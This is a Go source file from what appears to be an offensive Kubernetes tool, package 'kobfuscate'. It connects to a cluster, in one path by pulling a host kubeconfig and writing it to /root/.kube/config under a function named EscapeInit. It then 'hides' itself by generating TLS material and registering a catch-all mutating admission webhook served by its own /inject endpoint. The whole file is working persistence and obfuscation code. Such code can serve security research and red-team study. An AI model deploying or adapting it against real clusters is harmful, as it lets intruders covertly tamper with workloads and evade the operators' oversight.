/*===========================================================================*\
 *           MIT License Copyright (c) 2022 Kris Nóva <kris@nivenly.com>     *
 *                                                                           *
 *                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                *
 *                ┃   ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗   ┃                *
 *                ┃   ████╗  ██║██╔═████╗██║   ██║██╔══██╗  ┃                *
 *                ┃   ██╔██╗ ██║██║██╔██║██║   ██║███████║  ┃                *
 *                ┃   ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║  ┃                *
 *                ┃   ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║  ┃                *
 *                ┃   ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝  ┃                *
 *                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                *
 *                                                                           *
 *                       This machine kills fascists.                        *
 *                                                                           *
\*===========================================================================*/

package kobfuscate

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"k8s.io/client-go/tools/clientcmd"

	admissionregistrationv1 "k8s.io/api/admissionregistration/v1"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/sirupsen/logrus"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type Runtime struct {
	identifier string
	connected  bool
	namespace  string
	client     *kubernetes.Clientset

	caPEM         *bytes.Buffer
	certPEM       *bytes.Buffer
	privateKeyPEM *bytes.Buffer
}

const (
	DefaultServiceAccount string = "default"
	NamespaceLocation     string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
	HostKubeconfig        string = "/root/.kube/config"
)

var (
	RuntimeTimeout time.Duration = time.Second * 3
)

func NewRuntime(identifier string) *Runtime {
	return &Runtime{
		identifier: identifier,
	}
}

var (
	InjectionPath string = "/inject"
)

func (r *Runtime) DNSNames() []string {
	dnsNames := []string{
		r.identifier,
		r.identifier + "." + r.Namespace(),
		r.identifier + "." + r.Namespace() + ".svc",
	}
	return dnsNames
}

func (r *Runtime) ServiceName() string {
	return r.identifier + "." + r.Namespace() + ".svc"
}

func (r *Runtime) Addr() string {
	return fmt.Sprintf("%s:%d", "", 80)
}

func (r *Runtime) Orgs() []string {
	return []string{r.identifier + ".n0va"}
}

// Todo we will need a "Generic" way to hide things in Kube
// Todo What will our "hide" input look like? maybe labels?

func (r *Runtime) Hide() error {
	if !r.connected {
		return fmt.Errorf("unable to hide until connected. use runtime.EscapeInit() or runtime.InClusterInit()")
	}

	// Create Cert Material
	err := r.Certs()
	if err != nil {
		return fmt.Errorf("unable to generate TLS material for obfuscation: %v", err)
	}
	logrus.Infof("Generated mTLS cert material for Mutating WebHook")

	// Create a mutating webhook config
	sideEffect := admissionregistrationv1.SideEffectClassNone
	m := &admissionregistrationv1.MutatingWebhookConfiguration{
		ObjectMeta: metav1.ObjectMeta{
			Name:      r.Identifier(),
			Namespace: r.Namespace(),
		},
		Webhooks: []admissionregistrationv1.MutatingWebhook{
			{
				Name: r.ServiceName(),
				ClientConfig: admissionregistrationv1.WebhookClientConfig{
					URL: nil,
					Service: &admissionregistrationv1.ServiceReference{
						Namespace: r.Namespace(),
						Name:      r.ServiceName(),
						Path:      &InjectionPath,
						//Port:      nil,
					},
					CABundle: r.caPEM.Bytes(), // Inject CA Pem for the API server here!
				},
				Rules:         nil,
				FailurePolicy: nil,
				MatchPolicy:   nil,
				NamespaceSelector: &metav1.LabelSelector{
					MatchLabels:      nil,
					MatchExpressions: nil,
				},
				ObjectSelector: &metav1.LabelSelector{
					MatchLabels:      nil,
					MatchExpressions: nil,
				},
				SideEffects:             &sideEffect,
				AdmissionReviewVersions: []string{"v1", "v1beta1"},
			},
		},
	}

	_, err = r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Create(context.TODO(), m, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create mutating webhook configuration: %v", err)
	}

	logrus.Infof("Created: Mutating WebHook [%s].[%s]", r.Identifier(), r.Namespace())

	pair, err := tls.X509KeyPair(r.certPEM.Bytes(), r.privateKeyPEM.Bytes())
	if err != nil {
		return fmt.Errorf("failed to load certificate key pair: %v", err)
	}

	logrus.Infof("Generated [%d]bytes X509 pair for server", len(pair.OCSPStaple))

	server := &http.Server{
		Addr:      r.Addr(),
		TLSConfig: &tls.Config{Certificates: []tls.Certificate{pair}},
	}

	logrus.Infof("Initalizing server: %s", r.Addr())

	// Handle paths
	mux := &http.ServeMux{}
	mux.HandleFunc(InjectionPath, HandleInject)
	logrus.Infof("Registering endpoint: %s", InjectionPath)

	// Set the handler
	server.Handler = mux

	logrus.Infof("Listening...")

	return server.ListenAndServeTLS("", "")
}

func (r *Runtime) EscapeInit() error {

	// Host config
	kubeconfig, err := HostKubeConfig()
	if err != nil {
		return fmt.Errorf("unable to find host kubeconfig: %v", err)
	}
	err = ioutil.WriteFile(HostKubeconfig, []byte(kubeconfig), 0755)
	if err != nil {
		return fmt.Errorf("unable to write /tmp kubeconfig: %v", err)
	}

	cfg, err := clientcmd.BuildConfigFromFlags("", HostKubeconfig)
	if err != nil {
		return fmt.Errorf("unable to build config: %v", err)
	}

	// Client
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Host   : %s", cfg.Host)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())
	logrus.Infof("Connected to Kubernetes!")

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	r.connected = true
	return nil
}

// InClusterInit will ensure the client and see if we are running inside a cluster
func (r *Runtime) InClusterInit() error {

	// In cluster
	cfg, err := rest.InClusterConfig()
	if err != nil {
		return err
	}

	// Client
	cfg.Timeout = RuntimeTimeout
	logrus.Infof("Host   : %s", cfg.Host)
	logrus.Infof("Client : %s", cfg)
	client, err := kubernetes.NewForConfig(cfg)
	if err != nil {
		return err
	}
	v, err := client.ServerVersion()
	if err != nil {
		return fmt.Errorf("unable to communicate with api server: %v", err)
	}
	logrus.Infof("Version: %s", v.String())
	logrus.Infof("Connected to Kubernetes!")

	// We have authenticated with Kubernetes, we can set the client
	r.client = client
	r.connected = true
	return nil
}

func (r *Runtime) Client() *kubernetes.Clientset {
	return r.client
}

func (r *Runtime) Identifier() string {
	return r.identifier
}

func (r *Runtime) Namespace() string {
	if r.namespace == "" {
		bytes, err := ioutil.ReadFile(NamespaceLocation)
		if err != nil {
			return "default"
		}
		r.namespace = string(bytes)
	}
	return r.namespace
}
